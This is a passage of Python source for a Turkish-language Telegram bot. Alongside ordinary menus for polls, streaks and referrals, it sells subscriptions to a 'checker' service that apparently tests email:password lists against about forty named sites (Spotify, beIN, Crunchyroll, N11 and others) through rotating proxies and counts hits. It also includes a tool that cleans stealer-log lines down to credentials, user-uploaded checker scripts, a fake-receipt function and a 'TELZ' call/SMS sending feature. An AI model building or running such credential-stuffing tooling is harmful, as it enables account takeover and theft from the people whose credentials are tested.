      markup.add(types.InlineKeyboardButton("🔄 Kontrol Et / Ödül Al", callback_data="claim_channel_bonus"))
      bot.send_message(
        chat_id,
        f"❌ Henüz kanala katılmamışsınız.\n\n1) {CHANNEL_LINK} kanalına katılın\n2) **Kontrol Et** butonuna basın\n\n🎁 Ödül: **+{CHANNEL_BONUS:.0f} TL**\n\n⚠️ Botun kanalda admin olması gerekir.",
        reply_markup=markup,
        parse_mode="Markdown"
      )
    return

  elif call.data == "view_streak":
    safe_answer()
    data = login_streaks.get(user_id, {"count": 0, "last_date": "-"})
    text = (
      f"🔥 **GİRİŞ SERİSİ**\n\n"
      f"Mevcut seri: **{data.get('count', 0)} gün**\n"
      f"Son giriş: `{data.get('last_date', '-')}`\n\n"
      f"🎁 Ödüller:\n• 3 gün → +3 TL\n• 7 gün → +10 TL\n• 14 gün → +25 TL\n• Her 7 günde bir ekstra"
    )
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal"))
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "view_achievements":
    safe_answer()
    owned = set(user_achievements.get(user_id, []))
    text = "🏅 **BAŞARIMLAR**\n\n"
    for aid, info in ACHIEVEMENTS.items():
      mark = "✅" if aid in owned else "⬜"
      text += f"{mark} **{info['name']}** — {info['desc']} (+{info['reward']:.0f} TL)\n"
    text += f"\nKazanılan: **{len(owned)}/{len(ACHIEVEMENTS)}**"
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal"))
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "ref_leaderboard":
    safe_answer()
    top = get_referral_leaderboard(10)
    text = "🏆 **DAVET SIRALAMASI**\n\n"
    if top:
      for i, (uid, cnt) in enumerate(top, 1):
        medal = "🥇" if i == 1 else ("🥈" if i == 2 else ("🥉" if i == 3 else f"#{i}"))
        text += f"{medal} `{uid}` — **{cnt}** davet\n"
    else:
      text += "Henüz veri yok.\n"
    my_count = sum(1 for v in user_referrers.values() if v == user_id)
    text += f"\nSizin davet: **{my_count}**"
    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_referans"))
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "view_polls":
    safe_answer()
    open_polls = {k: v for k, v in active_polls.items() if not v.get("closed")}
    if not open_polls:
      bot.send_message(chat_id, "📭 Aktif anket yok.")
      return
    for pid, p in list(open_polls.items())[:10]:
      text = f"📊 **{p.get('question', 'Anket')}**\nID: `{pid}`\n\n"
      markup = types.InlineKeyboardMarkup(row_width=1)
      for i, opt in enumerate(p.get("options", [])):
        votes = len(opt.get("votes", set()))
        markup.add(types.InlineKeyboardButton(f"{opt['text']} ({votes})", callback_data=f"poll_vote_{pid}_{i}"))
      if user_id in admin_ids_set:
        markup.add(types.InlineKeyboardButton("🔒 Anketi Kapat", callback_data=f"poll_close_{pid}"))
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data.startswith("poll_vote_"):
    parts = call.data.split("_")
    if len(parts) < 4:
      safe_answer("Hata", show_alert=True)
      return
    pid, idx = parts[2], int(parts[3])
    if pid not in active_polls or active_polls[pid].get("closed"):
      safe_answer("Anket kapalı!", show_alert=True)
      return
    opts = active_polls[pid].get("options", [])
    if idx < 0 or idx >= len(opts):
      safe_answer("Geçersiz seçenek", show_alert=True)
      return
    for o in opts:
      votes = o.get("votes", set())
      if not isinstance(votes, set):
        votes = set(votes)
        o["votes"] = votes
      votes.discard(user_id)
    opts[idx].setdefault("votes", set()).add(user_id)
    save_data()
    safe_answer("✅ Oyunuz kaydedildi!", show_alert=True)
    text = f"📊 **{active_polls[pid].get('question')}**\n\n"
    for o in opts:
      text += f"• {o['text']}: **{len(o.get('votes', set()))}**\n"
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode="Markdown")
    except:
      pass
    return

  elif call.data.startswith("poll_close_"):
    if user_id not in admin_ids_set:
      safe_answer("Yetki yok", show_alert=True)
      return
    pid = call.data.split("_")[2]
    if pid in active_polls:
      active_polls[pid]["closed"] = True
      save_data()
      safe_answer("Anket kapatıldı", show_alert=True)
      bot.send_message(chat_id, f"🔒 Anket `{pid}` kapatıldı.")
    return

  elif call.data == "main_menu":
    safe_answer()
    user_states.pop(chat_id, None)
    try:
      admin_temp_data.pop(chat_id, None)
    except Exception:
      pass
    try:
      bot.delete_message(chat_id, call.message.message_id)
    except Exception:
      pass
    try:
      ana_menu_goster(chat_id, user_id)
    except Exception as e:
      try:
        bot.send_message(chat_id, "Ana menü açılamadı, /start yaz. Hata: %s" % e)
      except Exception:
        pass
    return

  elif call.data == "tool_strip_url":
    safe_answer()
    user_states[chat_id] = "waiting_strip_url"
    bot.send_message(
      chat_id,
      "🧹 **URL Silici**\n\n"
      "Log satırlarını gönder (tek veya çok satır).\n"
      "URL'ler silinir, sadece **email:password** kalır.\n\n"
      "Örnek:\n"
      "`mail@x.com:sifre123:https://site.com`\n"
      "`user@y.com:pass | https://a.com`\n\n"
      "İptal: /iptal",
      parse_mode="Markdown"
    )

  elif call.data == "menu_tempmail":
    safe_answer()
    text = tempmail_panel_text(user_id)
    markup = tempmail_panel_markup(user_id)
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

  elif call.data == "tempmail_new":
    safe_answer()
    if user_id in admin_ids_set:
      ok, res = tempmail_create()
      if not ok:
        bot.send_message(chat_id, f"❌ Mail oluşturulamadı: {res}")
        return
      user_temp_mails[user_id] = {
        "address": res["address"],
        "password": res.get("password"),
        "token": res["token"],
        "created": time.time(),
      }
      save_data()
      log_activity("tempmail_new", user_id, res["address"])
      bot.send_message(
        chat_id,
        f"✅ **Yeni geçici mail** (admin)\n\n"
        f"📬 `{res['address']}`\n\n"
        f"Kod için **Gelen Kutusu**.",
        reply_markup=tempmail_panel_markup(user_id),
        parse_mode="Markdown",
      )
      return
    send_tempmail_star_invoice(chat_id, user_id, TEMPMAIL_STAR_COST)

  elif call.data == "tempmail_inbox":
    info = user_temp_mails.get(user_id)
    if not info or not info.get("token"):
      safe_answer("Önce mail al!", show_alert=True)
      return
    safe_answer("Kutu kontrol ediliyor...")
    ok, msgs = tempmail_list_messages(info["token"])
    if not ok:
      try:
        r3 = requests.post(
          f"{MAILTM_BASE}/token",
          headers=_mailtm_headers(),
          json={"address": info["address"], "password": info["password"]},
          timeout=15,
        )
        if r3.status_code == 200:
          tok = (r3.json() or {}).get("token")
          if tok:
            info["token"] = tok
            user_temp_mails[user_id] = info
            ok, msgs = tempmail_list_messages(tok)
      except Exception:
        pass
    if not ok:
      bot.send_message(chat_id, f"❌ Gelen kutusu okunamadı: `{msgs}`\nYeni mail almayı dene.", parse_mode="Markdown")
      return
    if not msgs:
      bot.send_message(
        chat_id,
        f"📭 **Boş**\n\n📬 `{info['address']}`\nHenüz mail yok. Biraz bekle, tekrar dene.",
        parse_mode="Markdown",
      )
      return
    lines = [f"📥 **Gelen kutusu** — `{info['address']}`\n"]
    for i, m in enumerate(msgs[:10], 1):
      mid = m.get("id")
      subj = (m.get("subject") or "(konu yok)")[:80]
      frm = m.get("from") or {}
      if isinstance(frm, dict):
        frm = frm.get("address") or frm.get("name") or "?"
      intro = (m.get("intro") or "")[:120]
      codes = _extract_codes_from_text(f"{subj} {intro}")
      code_txt = f"\n🔑 Kod: **{' · '.join(codes)}**" if codes else ""
      lines.append(f"**{i}.** {subj}\nFrom: `{frm}`\n{intro}{code_txt}")
      if mid:
        ok2, full = tempmail_read_message(info["token"], mid)
        if ok2 and isinstance(full, dict):
          body = full.get("text") or full.get("html") or ""
          if isinstance(body, str):
            body_plain = re.sub(r"<[^>]+>", " ", body)
            more = _extract_codes_from_text(body_plain)
            if more:
              lines.append(f"🔑 Mail içi kod: **{' · '.join(more)}**")
    lines.append("\n🔄 Yenilemek için tekrar **Gelen Kutusu**'na bas.")
    text = "\n\n".join(lines)
    if len(text) > 3500:
      text = text[:3500] + "\n…"
    markup = tempmail_panel_markup(user_id)
    bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

  elif call.data == "tempmail_delete":
    safe_answer()
    user_temp_mails.pop(user_id, None)
    text = "🗑 Geçici mail silindi.\nYeni almak için **Yeni Mail Al**."
    markup = tempmail_panel_markup(user_id)
    try:
      bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

  elif call.data == "menu_smm":
    safe_answer()
    bot.send_message(chat_id, "❌ SMM paneli kaldırıldı.")
    return

  if call.data and (call.data == "smm_refresh" or call.data.startswith("smm_")):
    safe_answer("SMM kaldırıldı", show_alert=True)
    try:
      bot.send_message(chat_id, "❌ SMM paneli kaldırıldı.")
    except Exception:
      pass
    return

  if call.data == "smm_refresh":
    safe_answer()
    if user_id not in admin_ids_set:
      return
    smm_get_services(force=True)
    n = len(smm_get_services())
    bot.send_message(chat_id, f"🔄 SMM cache yenilendi: **{n}** servis", parse_mode="Markdown")
    return

  if call.data == "smm_my_orders":
    safe_answer()
    mine = [(oid, o) for oid, o in smm_orders.items() if int(o.get("user_id") or 0) == int(user_id)]
    mine = sorted(mine, key=lambda x: float(x[1].get("time") or 0), reverse=True)[:15]
    if not mine:
      bot.send_message(chat_id, "📦 Henüz SMM siparişin yok.")
      return
    lines = ["📦 **SMM Siparişlerin**"]
    markup = types.InlineKeyboardMarkup(row_width=1)
    for oid, o in mine:
      lines.append(
        f"• `{oid}` panel:**{o.get('panel_order')}** · {o.get('status','?')} · {o.get('qty')} ad · {o.get('price_tl',0):.2f}₺"
      )
      if o.get("panel_order"):
        markup.add(types.InlineKeyboardButton(
          f"Durum #{o.get('panel_order')}",
          callback_data=f"smm_stat_{o.get('panel_order')}",
        ))
    markup.add(types.InlineKeyboardButton("🔙 SMM", callback_data="menu_smm"))
    bot.send_message(chat_id, chr(10).join(lines)[:3500], reply_markup=markup, parse_mode="Markdown")
    return

  if call.data and call.data.startswith("smm_cats_"):
    safe_answer()
    try:
      page = int(call.data.split("_")[-1])
    except Exception:
      page = 0
    smm_show_categories(chat_id, user_id, page=page, message_id=call.message.message_id)
    return

  if call.data and call.data.startswith("smm_cat_"):
    safe_answer()
    parts = call.data.split("_")
    try:
      cat_index = int(parts[2])
      page = int(parts[3]) if len(parts) > 3 else 0
    except Exception:
      bot.send_message(chat_id, "❌ Kategori hatası")
      return
    smm_show_services(chat_id, user_id, cat_index, page=page, message_id=call.message.message_id)
    return

  if call.data and call.data.startswith("smm_svc_"):
    safe_answer()
    try:
      sid = int(call.data.replace("smm_svc_", ""))
    except Exception:
      return
    svc = smm_find_service(sid)
    if not svc:
      bot.send_message(chat_id, "❌ Servis bulunamadı.")
      return
    tl1000, usd1000 = smm_price_tl(svc["rate"], 1000)
    admin_temp_data[chat_id] = {
      "smm_service": sid,
      "smm_name": svc["name"],
      "smm_rate": svc["rate"],
      "smm_min": svc["min"],
      "smm_max": svc["max"],
    }
    user_states[chat_id] = "waiting_smm_link"
    bot.send_message(
      chat_id,
      f"📈 **{svc['name'][:80]}**\n"
      f"🆔 Servis: `{sid}`\n"
      f"📦 Min/Max: **{svc['min']}** / **{svc['max']}**\n"
      f"💵 ~**{tl1000:.2f} TL** / 1000 adet\n\n"
      f"🔗 **Linki** gönder (profil/gönderi URL)\n"
      f"İptal: /iptal",
      parse_mode="Markdown",
    )
    return

  if call.data and call.data.startswith("smm_stat_"):
    safe_answer()
    oid = call.data.replace("smm_stat_", "").strip()
    st = smm_order_status(oid)
    if st.get("error"):
      bot.send_message(chat_id, f"❌ Durum alınamadı: {st.get('error')}")
      return
    bot.send_message(
      chat_id,
      f"📦 Sipariş `{oid}`\n"
      f"📊 Status: **{st.get('status','?')}**\n"
      f"💰 Charge: {st.get('charge','?')} {st.get('currency','')}\n"
      f"▶️ Start: {st.get('start_count','?')} · Kalan: {st.get('remains','?')}",
      parse_mode="Markdown",
    )
    return

  if call.data and call.data.startswith("smm_confirm_"):
    safe_answer()
    try:
      qty = int(call.data.replace("smm_confirm_", ""))
    except Exception:
      return
    data = admin_temp_data.get(chat_id) or {}
    sid = data.get("smm_service")
    link = data.get("smm_link")
    rate = float(data.get("smm_rate") or 0)
    if not sid or not link:
      bot.send_message(chat_id, "❌ Sipariş verisi eksik. Baştan seç.")
      user_states.pop(chat_id, None)
      return
    svc = smm_find_service(sid) or {}
    min_q = int(data.get("smm_min") or svc.get("min") or 1)
    max_q = int(data.get("smm_max") or svc.get("max") or qty)
    if qty < min_q or qty > max_q:
      bot.send_message(chat_id, f"❌ Miktar {min_q}-{max_q} arası olmalı.")
      return
    price_tl, cost_usd = smm_price_tl(rate, qty)
    bal = float(user_balances.get(user_id, 0.0) or 0)
    if bal < price_tl and user_id not in admin_ids_set:
      bot.send_message(chat_id, f"❌ Yetersiz bakiye. Gerekli: **{price_tl:.2f} TL** · Senin: **{bal:.2f} TL**", parse_mode="Markdown")
      return
    pbal, pcur = smm_panel_balance()
    if pbal is not None and pbal < cost_usd * 0.95:
      bot.send_message(
        chat_id,
        f"⚠️ Panel bakiyesi yetersiz (**{pbal:.4f} {pcur}**). Admin panele USD yüklemeli.\n"
        f"Sipariş şimdilik açılmadı.",
        parse_mode="Markdown",
      )
      return
    if user_id not in admin_ids_set:
      user_balances[user_id] = bal - price_tl
      add_balance_history(user_id, "smm_order", -price_tl, f"svc {sid} x{qty}")
    ok, panel_order, raw = smm_place_order(sid, link, qty)
    if not ok:
      if user_id not in admin_ids_set:
        user_balances[user_id] = float(user_balances.get(user_id, 0.0) or 0) + price_tl
        add_balance_history(user_id, "smm_refund", price_tl, f"fail {sid}")
      save_data()
      bot.send_message(chat_id, f"❌ Panel sipariş hatası: `{raw}`\nBakiye iade edildi.", parse_mode="Markdown")
      user_states.pop(chat_id, None)
      admin_temp_data.pop(chat_id, None)
      return
    local_id = str(uuid.uuid4())[:8]
    smm_orders[local_id] = {
      "user_id": int(user_id),
      "panel_order": panel_order,
      "service": int(sid),
      "name": data.get("smm_name") or "",
      "link": link,
      "qty": int(qty),
      "price_tl": float(price_tl),
      "cost_usd": float(cost_usd),
      "status": "Pending",
      "time": time.time(),
    }
    save_data()
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📊 Durum sorgula", callback_data=f"smm_stat_{panel_order}"))
    markup.add(types.InlineKeyboardButton("📈 SMM menü", callback_data="menu_smm"))
    bot.send_message(
      chat_id,
      f"✅ **SMM sipariş alındı**\n\n"
      f"🆔 Yerel: `{local_id}`\n"
      f"🏭 Panel order: **{panel_order}**\n"
      f"📦 {data.get('smm_name','')[:60]}\n"
      f"🔗 `{link[:80]}`\n"
      f"🔢 **{qty}** adet\n"
      f"💵 **- {price_tl:.2f} TL**\n"
      f"💳 Kalan: **{float(user_balances.get(user_id,0)):.2f} TL**",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    log_activity("smm_order", user_id, f"{panel_order}:{sid}:{qty}:{price_tl}")
    return

  elif call.data == "chk_sub_menu":
    safe_answer()
    lines = [
      "💎 Checker Abonelik",
      "",
      checker_sub_status_text(user_id).replace("**", ""),
      "",
      "Paket seç (bakiye veya yıldız):",
      "",
    ]
    for k, p in CHECKER_SUB_PLANS.items():
      lines.append("- %s — %s TL veya %s yıldız" % (p["title"], int(p["tl"]), int(p["stars"])))
    lines.append("")
    lines.append("Abone: checker + log sınırsız · market günde max 100")
    body = "\n".join(lines)
    markup = types.InlineKeyboardMarkup(row_width=1)
    for k, p in CHECKER_SUB_PLANS.items():
      markup.add(types.InlineKeyboardButton(
        "💵 %s · %s TL" % (p["title"], int(p["tl"])),
        callback_data="chk_sub_buy_" + k,
      ))
    for k, p in CHECKER_SUB_PLANS.items():
      markup.add(types.InlineKeyboardButton(
        "⭐ %s · %s⭐" % (p["title"], int(p["stars"])),
        callback_data="chk_sub_star_" + k,
      ))
    markup.add(types.InlineKeyboardButton("Hediye kodu kullan", callback_data="prem_code_redeem_btn"))
    markup.add(types.InlineKeyboardButton("Ana Menu", callback_data="main_menu"))
    try:
      bot.edit_message_text(body, chat_id, call.message.message_id, reply_markup=markup)
    except Exception:
      try:
        bot.send_message(chat_id, body, reply_markup=markup)
      except Exception as e:
        try:
          bot.send_message(chat_id, "Abonelik menüsü açılamadı: %s" % e)
        except Exception:
          pass
    return

  elif call.data and call.data.startswith("chk_sub_buy_"):
    safe_answer()
    plan_key = call.data.replace("chk_sub_buy_", "", 1)
    if plan_key not in CHECKER_SUB_PLANS:
      return
    admin_temp_data[chat_id] = {"sub_plan": plan_key, "sub_pay": "balance"}
    title = CHECKER_SUB_PLANS[plan_key]["title"]
    price = int(CHECKER_SUB_PLANS[plan_key]["tl"])
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("1) Kendim kullanacagim", callback_data="chk_sub_do_self"))
    markup.add(types.InlineKeyboardButton("2) Hediye kodu olustur", callback_data="chk_sub_do_gift"))
    markup.add(types.InlineKeyboardButton("Geri", callback_data="chk_sub_menu"))
    msg = "Paket: %s (%s TL)\n\nNasil kullanilsin?\n- Kendin: Premium sana\n- Kod: baska biri Premium olur" % (title, price)
    try:
      bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=markup)
    except Exception:
      bot.send_message(chat_id, msg, reply_markup=markup)
    return

  elif call.data and call.data.startswith("chk_sub_star_"):
    safe_answer()
    plan_key = call.data.replace("chk_sub_star_", "", 1)
    if plan_key not in CHECKER_SUB_PLANS:
      return
    admin_temp_data[chat_id] = {"sub_plan": plan_key, "sub_pay": "stars"}
    title = CHECKER_SUB_PLANS[plan_key]["title"]
    stars = int(CHECKER_SUB_PLANS[plan_key]["stars"])
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("1) Kendim kullanacagim", callback_data="chk_sub_do_self"))
    markup.add(types.InlineKeyboardButton("2) Hediye kodu olustur", callback_data="chk_sub_do_gift"))
    markup.add(types.InlineKeyboardButton("Geri", callback_data="chk_sub_menu"))
    msg = "Paket: %s (%s yildiz)\n\nNasil kullanilsin?" % (title, stars)
    try:
      bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=markup)
    except Exception:
      bot.send_message(chat_id, msg, reply_markup=markup)
    return

  elif call.data in ("chk_sub_do_self", "chk_sub_do_gift"):
    safe_answer()
    meta = admin_temp_data.get(chat_id) or {}
    plan_key = meta.get("sub_plan")
    pay = meta.get("sub_pay") or "balance"
    mode = "gift" if str(call.data).endswith("gift") else "self"
    if not plan_key or plan_key not in CHECKER_SUB_PLANS:
      bot.send_message(chat_id, "Oturum dustu, menuden tekrar sec.")
      return
    if mode == "gift":
      admin_temp_data[chat_id] = {"sub_plan": plan_key, "sub_pay": pay}
      user_states[chat_id] = "waiting_gift_custom_code"
      bot.send_message(chat_id, "Hediye kodunu KENDIN yaz (ornegin NAPIMAMM)\nveya auto yaz (rastgele).\n4-24 harf/rakam. Iptal: /iptal")
      return
    if pay == "stars":
      send_checker_sub_star_invoice(chat_id, user_id, plan_key, mode="self")
      return
    ok, msg, code = buy_checker_sub_balance(user_id, plan_key, mode="self")
    if ok:
      try:
        send_fake_sub_receipt(chat_id, user_id, plan_key, float(CHECKER_SUB_PLANS[plan_key]["tl"]), method="Bot Bakiyesi")
      except Exception:
        pass
      markup = types.InlineKeyboardMarkup()
      markup.add(types.InlineKeyboardButton("Checker", callback_data="menu_checker"))
      bot.send_message(chat_id, "Abonelik aktif!\n\n" + str(msg).replace("**", ""), reply_markup=markup)
    else:
      markup = types.InlineKeyboardMarkup()
      markup.add(types.InlineKeyboardButton("Abonelik menu", callback_data="chk_sub_menu"))
      bot.send_message(chat_id, str(msg), reply_markup=markup)
    return

  elif call.data == "prem_code_redeem_btn":
    safe_answer()
    user_states[chat_id] = "waiting_premium_code"
    bot.send_message(chat_id, "Premium hediye kodunu yaz:\nOrnek: NPAB12CD34\nIptal: /iptal")
    return

  elif call.data == "menu_checker":
    safe_answer()
    if not has_checker_sub(user_id):
      markup = types.InlineKeyboardMarkup(row_width=1)
      markup.add(types.InlineKeyboardButton("💎 Abonelik Al", callback_data="chk_sub_menu"))
      markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
      msg_lock = (
        "🔒 **Checker kilitli**\n\n"
        "Abonelik almadan checker menüsüne girilemez.\n"
        "1 gün / 7 gün / 30 gün veya ömür boyu paket seç."
      )
      try:
        bot.edit_message_text(msg_lock, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
      except Exception:
        bot.send_message(chat_id, msg_lock, reply_markup=markup, parse_mode="Markdown")
      return
    times_txt = "∞ (admin)" if user_id in admin_ids_set else f"max {TELZ_MAX_TIMES}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("✅ Abonelik aktif", callback_data="chk_sub_menu"))
    favs = list(checker_favorites.get(user_id) or [])[:5]
    recents = list(checker_recent.get(user_id) or [])[:5]
    if favs:
      markup.add(types.InlineKeyboardButton("⭐ Favorilerim", callback_data="chk_favs_list"))
    if recents:
      markup.add(types.InlineKeyboardButton("🕘 Son kullanılan", callback_data="chk_recent_list"))
    shown = 0
    for cid, meta in list(custom_checkers.items()):
      if not meta.get("active", True):
        continue
      if meta.get("private"):
        if user_id not in admin_ids_set and int(meta.get("author_id") or 0) != int(user_id):
          continue
      nm = meta.get("name") or cid
      prefix = "🔒 " if meta.get("private") else "🐍 "
      markup.add(types.InlineKeyboardButton(f"{prefix}{nm}", callback_data=f"tool_cchk_{cid}"))
      shown += 1
      if shown >= 20:
        break
    markup.add(
      types.InlineKeyboardButton("📤 Kendi PY Checker Ekle", callback_data="cchk_upload"),
      types.InlineKeyboardButton("📋 PY Taleplerim", callback_data="cchk_my_pending"),
    )
    if user_id in admin_ids_set:
      markup.add(types.InlineKeyboardButton("👑 Admin PY Ekle (direkt menü)", callback_data="admin_py_upload"))
      markup.add(types.InlineKeyboardButton("🛠 PY Yönet (ad/sil)", callback_data="cchk_admin_manage"))
    markup.add(
      types.InlineKeyboardButton("🔗 Proxy ekle / değiştir", callback_data="checker_proxy_set"),
      types.InlineKeyboardButton("▶️ Proxysiz devam (temizle)", callback_data="checker_proxy_clear"),
      types.InlineKeyboardButton("🛒 ══ N11 CHECKER ══", callback_data="tool_n11"),
      types.InlineKeyboardButton("🎮 ══ CPM CHECKER ══", callback_data="tool_cpm"),
      types.InlineKeyboardButton("🎮 ══ CPM V2 ══", callback_data="tool_cpmv2"),
      types.InlineKeyboardButton("💎 ══ S2GEPIN CHECKER ══", callback_data="tool_s2gepin"),
      types.InlineKeyboardButton("👗 ══ PENTI CHECKER ══", callback_data="tool_penti"),
      types.InlineKeyboardButton("🍬 ══ CANDY CRUSH ══", callback_data="tool_candy"),
      types.InlineKeyboardButton("📰 ══ KURUMEDYA ══", callback_data="tool_kurumedy"),
      types.InlineKeyboardButton("📈 ══ SMMTÜRK ══", callback_data="tool_smmturk"),
      types.InlineKeyboardButton("📡 ══ SMPANEL ══", callback_data="tool_smpanel"),
      types.InlineKeyboardButton("🌍 ══ WORLDOFSMM ══", callback_data="tool_worldofsmm"),
      types.InlineKeyboardButton("🟣 ══ JUSTANOTHERPANEL ══", callback_data="tool_jap"),
      types.InlineKeyboardButton("🛒 ══ VPAZARI ══", callback_data="tool_vpazari"),
      types.InlineKeyboardButton("🎯 ══ PREDUNYAM ══", callback_data="tool_predunyam"),
      types.InlineKeyboardButton("⚽ ══ MACKOLIK ══", callback_data="tool_mackolik"),
      types.InlineKeyboardButton("🎮 ══ OZYGAME ══", callback_data="tool_ozygame"),
      types.InlineKeyboardButton("🎬 ══ CAPCUT ══", callback_data="tool_capcut"),
      types.InlineKeyboardButton("🖥 ══ VERISUNUCU ══", callback_data="tool_verisunucu"),
      types.InlineKeyboardButton("📱 ══ SMSONAY ══", callback_data="tool_smsonay"),
      types.InlineKeyboardButton("📲 ══ BURAKSMSONAY ══", callback_data="tool_buraksmsonay"),
      types.InlineKeyboardButton("🔥 ══ FENIXOYUN ══", callback_data="tool_fenix"),
      types.InlineKeyboardButton("💼 ══ EZGLOBAL ══", callback_data="tool_ezglobal"),
      types.InlineKeyboardButton("🛒 ══ EPINFY ══", callback_data="tool_epinfy"),
      types.InlineKeyboardButton("🎵 ══ SPOTIFY-VM ══", callback_data="tool_spotify"),
      types.InlineKeyboardButton("👻 ══ SNAPCHAT-VM ══", callback_data="tool_snapchat"),
      types.InlineKeyboardButton("📺 ══ MEDYABAYIM ══", callback_data="tool_medyabayim"),
      types.InlineKeyboardButton("📚 ══ BKM KİTAP ══", callback_data="tool_bkm"),
      types.InlineKeyboardButton("📣 ══ BARLASMEDYA ══", callback_data="tool_barlas"),
      types.InlineKeyboardButton("📖 ══ IDEFIX ══", callback_data="tool_idefix"),
      types.InlineKeyboardButton("🕹 ══ OYUNCUSTORE ══", callback_data="tool_oyuncustore"),
      types.InlineKeyboardButton("💎 ══ OYUNDINAR ══", callback_data="tool_oyundinar"),
      types.InlineKeyboardButton("📲 ══ SMSONAY.COM ══", callback_data="tool_smsonaycom"),
      types.InlineKeyboardButton("📡 ══ TODTV ══", callback_data="tool_todtv"),
      types.InlineKeyboardButton("📡 ══ BEIN ══", callback_data="tool_bein"),
      types.InlineKeyboardButton("🏟 ══ SSPORT ══", callback_data="tool_ssport"),
      types.InlineKeyboardButton("📺 ══ TABII ══", callback_data="tool_tabii"),
      types.InlineKeyboardButton("🍥 ══ CRUNCHYROLL ══", callback_data="tool_crunchyroll"),
      types.InlineKeyboardButton(
        "📞 ══ CALL (TELZ) 🔧 BAKIM ══" if not feature_telz_enabled else "📞 ══ CALL (TELZ) ══",
        callback_data="tool_telz",
      ),
      types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu"),
    )
    text = (
      "🎮 **CHECKER MENÜSÜ**\n\n"
      + _proxy_status_line(user_id) + "\n"
      "Proxy ekle → tüm checkerlarda geçerli\n\n"
      "• N11 · CPM · S2GEPIN · PENTI · CANDY · SMM paneller\n"
      "• CRUNCHYROLL · streaming · TELZ ve diğerleri\n\n"
      f"📦 Max numara: **{TELZ_MAX_NUMBERS}**\n"
      f"🔁 Gönderim adedi: **{times_txt}**"
    )
    try:
      bot.edit_message_text(
        text,
        chat_id,
        call.message.message_id,
        reply_markup=markup,
        parse_mode="Markdown",
      )
    except Exception:
      bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

  elif call.data == "checker_proxy_set":
    safe_answer()
    user_states[chat_id] = "waiting_global_proxy"
    bot.send_message(
      chat_id,
      "🔗 **Proxy listesi (tüm checkerlar)**\n\n"
      "Metin veya 📎 `.txt` gönder\n"
      "Format: `ip:port` · `user:pass@ip:port` · `ip:port:user:pass`\n"
      "Birden fazla satır = rotasyon\n\nİptal: /iptal",
      parse_mode="Markdown",
    )

  elif call.data == "checker_proxy_clear":
    safe_answer()
    set_user_proxies(user_id, [])
    bot.send_message(chat_id, "▶️ Proxy temizlendi — checkerlar **proxysiz** çalışır.")

  elif call.data == "cpmv2_stop":
    safe_answer()
    if user_id in active_cpmv2_jobs:
      active_cpmv2_jobs[user_id]["stop"] = True
      bot.send_message(chat_id, "🛑 CPM 2 durduruluyor...")
    else:
      bot.send_message(chat_id, "Aktif CPM 2 yok.")
    return

  elif call.data == "cpm_stop":

    job = active_cpm_jobs.get(user_id)
    if not job:
      safe_answer("Aktif CPM taraması yok.", show_alert=True)
      return
    if job.get("stop"):
      safe_answer("Zaten durduruluyor...", show_alert=True)
      return
    job["stop"] = True
    active_cpm_jobs[user_id] = job
    safe_answer("🛑 Durduruluyor — mevcut hesap bitince kesilir.")
    try:
      bot.send_message(
        chat_id,
        "🛑 **CPM durduruluyor...**\n"
        f"Şu ana kadar: kontrol **{job.get('checked', 0)}** · "
        f"HIT **{job.get('hits', 0)}** · BAD **{job.get('bads', 0)}**",
        parse_mode="Markdown",
      )
    except Exception:
      pass

  elif call.data == "s2gepin_stop":
    job = active_s2gepin_jobs.get(user_id)
    if not job:
      safe_answer("Aktif S2GEPIN yok.", show_alert=True)
      return
    if job.get("stop"):
      safe_answer("Zaten durduruluyor...", show_alert=True)
      return
    job["stop"] = True
    active_s2gepin_jobs[user_id] = job
    safe_answer("🛑 S2GEPIN durduruluyor...")
    try:
      bot.send_message(chat_id, f"🛑 **S2GEPIN durduruluyor...** {job.get('checked', 0)}/{job.get('total', 0)} · HIT {job.get('hits', 0)}", parse_mode="Markdown")
    except Exception:
      pass

  elif call.data == "penti_stop":
    job = active_penti_jobs.get(user_id)
    if not job:
      safe_answer("Aktif PENTI yok.", show_alert=True)
      return
    if job.get("stop"):
      safe_answer("Zaten durduruluyor...", show_alert=True)
      return
    job["stop"] = True
    active_penti_jobs[user_id] = job
    safe_answer("🛑 PENTI durduruluyor...")
    try:
      bot.send_message(chat_id, f"🛑 **PENTI durduruluyor...** {job.get('checked', 0)}/{job.get('total', 0)} · HIT {job.get('hits', 0)}", parse_mode="Markdown")
    except Exception:
      pass

